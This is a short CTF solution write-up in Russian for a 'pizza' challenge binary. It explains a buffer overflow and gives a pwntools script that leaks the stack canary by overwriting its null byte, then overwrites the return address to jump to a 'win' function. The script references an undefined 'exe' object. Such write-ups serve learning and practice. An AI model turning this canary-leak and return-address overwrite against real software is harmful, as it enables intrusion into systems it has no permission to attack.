# Solution
Уязвимость переполнения буфера. Ошибка при чтении в буффер address, считывается 0x40 байт, размер буффера - 40 байт. 
Сначала нужно переполнить буфер, чтобы перезаписать младший байт канарейки (\x00), 
чтобы канарейка вывелась вместе со строкой адреса. 
После чего, зная канарейку можно переписать адресс возврата.

```py
from pwn import *

io = process("./pizza")

# do all pizza stuff
io.sendlineafter(b"2. Yes, but next time\n", b"1")
io.sendlineafter(b"What's your name?\n", b"al3x")
io.sendlineafter(b"What pizza do you want?\n", b"pepperoni")
io.sendlineafter(b"2. No\n", b"1")
io.sendlineafter(b"2. No\n", b"2")
io.sendlineafter(b"2. No\n", b"1")

# overwrite first byte of canary which is alwasy null with '\n'
# to make on stack string like: "A"*44 + "\n" + canary[1:]
io.sendafter(b"What's your address?\n", b"A"*44 + b"\n")
io.recvuntil(b"A"*44)
canary = u64(io.recv(8))
canary -= ord('\n') # null last byte to get rid of '\n'
log.info(f"Canary: {hex(canary)}")

# overwrite return address with win function
io.sendlineafter(b"2. No\n", b"2")

pl = b""
pl += b"A"*44 # padding
pl += p64(canary) # canary
pl += b"B"*8 # rbp
pl += p64(exe.symbols["win"]) # return address

io.sendlineafter(b"What's your address?\n", pl)

io.interactive()

```